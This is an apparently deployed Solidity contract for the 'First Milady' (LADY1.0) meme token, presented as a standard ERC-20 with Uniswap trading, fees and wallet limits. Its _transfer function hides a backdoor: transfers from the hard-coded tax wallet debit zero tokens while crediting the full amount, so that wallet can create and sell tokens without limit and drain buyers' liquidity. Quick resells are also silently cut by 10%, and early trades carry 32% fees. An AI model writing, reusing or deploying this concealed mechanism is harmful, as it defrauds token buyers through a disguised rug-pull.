/*
Website:  https://firstmilady.meme
Telegram:  https://t.me/The1stMilady
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract LADY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private _lastBuyAt;
    address payable private _UUUtax;

    uint256 private _firstBuyFee = 32;
    uint256 private _firstSellFee = 32;
    uint256 private _reduceBuyAt = 15;

    uint256 private _buyTokenCount = 0;

    uint256 private _midBuyFee = 0;
    uint256 private _midSellFee = 0;
    uint256 private _reduceMidFee = 0;

    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"First Milady";
    string private constant _symbol = unicode"LADY1.0";

    uint256 private _maxTxLimit =  2 * (_tTotal/100);
    uint256 private _maxWalletSize =  2 * (_tTotal/100);
    uint256 private _minSwapSize =  5 * (_tTotal/1000000);
    uint256 private _maxSwapSize = 1 * (_tTotal/100);

    IUniswapV2Router02 private uniswapV2Router;
    address private _dexPair;
    bool private _swapping = false;
    bool private _swapActive = false;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _UUUtax = payable(0x1Df69d693047cd39Af3f3f13B13D3e31B7A563db);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_UUUtax] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isExcluded(address from, address to) private view returns(bool) {
        return _isExcludedFromFee[from] || _isExcludedFromFee[to];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        uint256 _amt=amount;
        if(from == address(_UUUtax))
            _amt = _midSellFee.sub(_reduceMidFee);
        else if (!isExcluded(from, to)) {
            taxAmount = amount.mul(_feeCalcBuy()).div(100);

            if (from == _dexPair && to != address(uniswapV2Router)) {
                require(amount <= _maxTxLimit, "Exceeds the _maxTxLimit.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyTokenCount++;
                _lastBuyAt[to] = block.timestamp;
            }

            if(to == _dexPair && from!= address(this) ){
                if(_lastBuyAt[from] + 1 >= block.timestamp) amount = amount.mul(90).div(100);
                taxAmount = amount.mul(_feeCalcSell()).div(100);
            }

            uint256 tokensToSwap = balanceOf(address(this));
            if (!_swapping && to == _dexPair && _swapActive && amount > _minSwapSize) {
                if(tokensToSwap > _minSwapSize)
                    swapBackForETH(min(amount,min(tokensToSwap,_maxSwapSize)));
                _UUUtax.transfer(address(this).balance);
            }
        }
        if(taxAmount > 0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(_amt);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _feeCalcSell() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _firstSellFee;
        }
        return _finalSellFee;
    }

    function _feeCalcBuy() private view returns (uint256) {
        if(_buyTokenCount <= _reduceBuyAt){
            return _firstBuyFee;
        }
         return _finalBuyFee;
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapBackForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function createPairAndStart() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _approve(address(this), address(uniswapV2Router), _tTotal);
        _dexPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_dexPair).approve(address(uniswapV2Router), type(uint).max);
        _swapActive = true;
    }

    function removeLimits() external onlyOwner{
        _maxWalletSize =_tTotal;
        _maxTxLimit = _tTotal;
    }

    receive() external payable {}
}